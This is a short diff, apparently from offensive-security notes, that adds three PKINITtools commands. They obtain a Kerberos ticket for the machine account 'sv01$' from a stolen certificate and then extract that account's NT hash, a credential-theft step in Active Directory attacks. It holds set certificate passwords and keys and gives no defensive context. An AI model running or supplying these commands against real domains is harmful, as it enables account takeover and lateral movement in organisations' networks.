@@ -1,0 +1,3 @@
+gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
+gettgtpkinit.py -pfx-base64 'CERT_BASE64' -dc-ip 'DC_IP' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
+KRB5CCNAME='sv01.ccache' getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' "$DOMAIN"/'sv01$'
